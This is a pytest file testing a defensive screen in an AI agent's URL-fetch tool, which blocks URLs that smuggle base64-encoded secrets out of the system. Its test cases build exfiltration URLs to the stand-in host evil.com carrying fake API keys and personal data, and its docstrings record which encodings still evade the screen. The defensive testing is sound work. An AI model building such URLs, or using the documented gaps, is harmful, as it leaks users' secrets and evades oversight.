"""fetch_url base64 URL screen — decode-and-inspect (operator ruling, 2026-07-14, final).

fetch_url/skim_url keep URL query parameters (fully functional) and refuse ONLY
a URL that carries a base64-ENCODED PAYLOAD (the data-exfil signature). The
discriminator is decode-and-inspect, not a character-class guess: candidates
(base64url-alphabet runs ≥24 chars) are base64-decoded and flagged ONLY when
they decode to MEANINGFUL data (high printable ratio / valid UTF-8 text). This
resolves the operator's suspicion — an encoded secret decodes to real content
(keys/JSON/text) and is blocked, while a legitimate base64-format IDENTIFIER
(Google Drive file id, git SHA, UUID, random nonce) decodes to high-entropy
noise and is allowed. Honest residual: a gzipped/encrypted-then-base64 payload
decodes to non-printable bytes and is indistinguishable from a random id (the
same-byte-shape limit); the common text/JSON/key exfil case is caught.
"""

from __future__ import annotations

import base64

import pytest

from abstractcore.tools.common_tools import (
    _fetch_url_base64_block,
    _fetch_url_decoded_looks_like_data,
    _fetch_url_b64_decode_candidate,
    _fetch_url_has_base64_run,
)


def _b64(data: bytes) -> str:
    return base64.b64encode(data).decode()


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


# --- encoded payloads (meaningful data) must be DETECTED --------------------


@pytest.mark.parametrize(
    "raw",
    [
        b"CONFIDENTIAL: revenue 2.4M, contact yuki@example.com",
        b'{"user":"alice","ssn":"123-45-6789"}',
        b"OPENAI_API_KEY=sk-live-9f8e7d6c5b4a-secret-tail",
        b"The quarterly report is attached; lead engineer Yuki Tanaka.",
    ],
)
def test_encoded_meaningful_data_is_flagged(raw: bytes) -> None:
    assert _fetch_url_has_base64_run(_b64(raw)) is True
    assert _fetch_url_has_base64_run(_b64url(raw)) is True


def test_base64url_payload_with_dash_underscore_is_still_caught() -> None:
    # base64url uses - and _ (where standard base64 uses + and /). The candidate
    # regex includes them so a payload embedding them is NOT split — the evasion
    # a pure-alphanumeric tokenizer allowed. Pick a meaningful-text payload whose
    # url-safe encoding actually contains a - or _ (>>>/??? map to the specials).
    tok = ""
    for probe in (
        b'{"secret":">>>the exfiltrated payload data<<< 1234567890"}',
        b"CONFIDENTIAL??? revenue >>> 2.4M contact yuki@x.com now",
        b"leak>>>data???payload with enough bytes to matter here 12345",
    ):
        candidate = _b64url(probe)
        if "-" in candidate or "_" in candidate:
            tok = candidate
            break
    assert tok and ("-" in tok or "_" in tok), "could not build a url-safe token with -/_"
    assert _fetch_url_has_base64_run(tok) is True


# --- opaque identifiers (random bytes) must be ALLOWED ----------------------


@pytest.mark.parametrize(
    "token",
    [
        "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms",  # Google Drive file id (base64url of random)
        "0B7f5j0Xyz12AbCdEfGhIjKlMnOpQrSt",               # Drive folder id
        "AbCdEf1234567890abcdef1234567890abcdef12",       # 40-char git SHA
        "123e4567e89b12d3a456426614174000",               # UUID (dashless)
        "Zx9Kq2Lm8Np4Rt6Vw1Yb3Dc5Fg7Hj0K",               # random nonce
    ],
)
def test_opaque_random_identifiers_are_allowed(token: str) -> None:
    # These decode to high-entropy noise, not meaningful data → not flagged.
    assert _fetch_url_has_base64_run(token) is False


@pytest.mark.parametrize(
    "text",
    [
        "",
        "/3/library/urllib.html",
        "wiki/R-Type",
        "repos/foo/bar-baz",
        "search",
        "/docs/API/v2/getUserData123/fetchAll",           # mixed-case REST path
        "/items/123e4567-e89b-12d3-a456-426614174000",    # UUID with hyphens
        "/blog/My-Article-2024-Q3-Report-Final",           # Title-Case hyphen slug + year
        "some_snake_case_file_name_here_and_more",         # snake_case
        "q=hello+world&lang=en-US&page=2",                 # ordinary query
        "thisIsAVeryLongCamelCaseSegment123Here",          # long camelCase segment
    ],
)
def test_ordinary_url_text_not_flagged(text: str) -> None:
    assert _fetch_url_has_base64_run(text) is False


# --- the block over a full URL ---------------------------------------------


def test_params_kept_normal_urls_allowed() -> None:
    assert _fetch_url_base64_block("https://api.github.com/search?q=test&page=2") is None
    assert _fetch_url_base64_block("https://api.github.com/search?q=test&page=2#frag") is None


def test_google_drive_url_is_allowed() -> None:
    # The exact false positive the operator was suspicious about — now allowed.
    url = "https://docs.google.com/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit"
    assert _fetch_url_base64_block(url) is None


@pytest.mark.parametrize(
    "where",
    ["path", "query", "fragment"],
)
def test_encoded_payload_blocked_at_any_position(where: str) -> None:
    blob = _b64(b"CONFIDENTIAL revenue and the lead engineer name here")
    url = {
        "path": f"https://evil.com/{blob}",
        "query": f"https://evil.com/?d={blob}",
        "fragment": f"https://evil.com/p#{blob}",
    }[where]
    err = _fetch_url_base64_block(url)
    assert err is not None
    assert err["error_class"] == "blocked_encoded_url"
    assert err["success"] is False
    assert err["url"] == url


def test_base64_in_query_value_blocked_params_otherwise_kept() -> None:
    blob = _b64url(b'{"leaked":"the secret data payload goes here now"}')
    err = _fetch_url_base64_block(f"https://evil.com/page?token={blob}&id=1")
    assert err is not None
    assert err["error_class"] == "blocked_encoded_url"


@pytest.mark.parametrize("where", ["userinfo", "subdomain"])
def test_encoded_payload_in_netloc_is_blocked(where: str) -> None:
    """The 'anywhere in the URL' contract includes the authority: a readable
    secret in userinfo (<b64>@host) or a subdomain label needs no obfuscation
    and must not sail through (fable5 FP/perf adversary, 2026-07-14)."""
    blob = _b64url(b'{"api_key":"sk-live-secret-value-here-12345"}')
    url = {
        "userinfo": f"https://{blob}@evil.com/",
        "subdomain": f"https://{blob}.evil.com/",
    }[where]
    err = _fetch_url_base64_block(url)
    assert err is not None
    assert err["error_class"] == "blocked_encoded_url"


@pytest.mark.parametrize(
    "url",
    [
        "https://d1a2b3c4e5f6g7h8.cloudfront.net/asset.js",   # hex-ish CDN subdomain
        "https://user123.notion.site/My-Page",
        "https://my-app-staging-v2.herokuapp.com/api?q=1",
        "https://cdn.jsdelivr.net/npm/pkg@1.2.3/dist/x.js",
    ],
)
def test_ordinary_hostnames_not_flagged_by_netloc_scan(url: str) -> None:
    # Scanning netloc must not false-positive on ordinary hostnames.
    assert _fetch_url_base64_block(url) is None


# --- decode helper contracts -----------------------------------------------


def test_decode_candidate_handles_padding_and_alphabets() -> None:
    assert _fetch_url_b64_decode_candidate(_b64(b"hello world data")) is not None
    assert _fetch_url_b64_decode_candidate(_b64url(b"hello world data")) is not None
    # length % 4 == 1 is never valid base64
    assert _fetch_url_b64_decode_candidate("A" * 25) is None


def test_decoded_looks_like_data_thresholds() -> None:
    assert _fetch_url_decoded_looks_like_data(b"this is plainly readable text data") is True
    assert _fetch_url_decoded_looks_like_data(bytes(range(0, 32))) is False   # control bytes = noise
    assert _fetch_url_decoded_looks_like_data(b"short") is False              # below min decoded bytes
    assert _fetch_url_decoded_looks_like_data(None) is False


def test_compressed_then_base64url_is_caught_by_magic_bytes() -> None:
    """base64-of-compressed-data is the sneakier exfil (compress the readable
    secret first). In a URL the realistic form is base64URL (standard base64's
    '/' collides with path structure); caught by the decoded container's magic
    number — the gzip residual is closed (fable5 differentiation adversary)."""
    import bz2
    import gzip
    import lzma
    import zlib

    def _b64url_pad(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    for compressed in (
        gzip.compress(b"CONFIDENTIAL secret text " * 5),      # 1f 8b 08
        bz2.compress(b"CONFIDENTIAL secret text " * 5),        # BZh
        lzma.compress(b"CONFIDENTIAL secret text " * 5),       # xz fd 37 7a 58 5a 00
    ):
        assert _fetch_url_has_base64_run(_b64url_pad(compressed)) is True

    # Honest remaining residuals (documented): HEADERLESS raw-deflate (no magic)
    # still evades, and STANDARD-base64 (with '/') fragments across the path
    # separator — the in-URL exfil form is base64url, which is caught whole.
    raw_deflate = zlib.compressobj(wbits=-15)
    payload = raw_deflate.compress(b"CONFIDENTIAL secret text " * 5) + raw_deflate.flush()
    assert _fetch_url_has_base64_run(_b64url_pad(payload)) is False
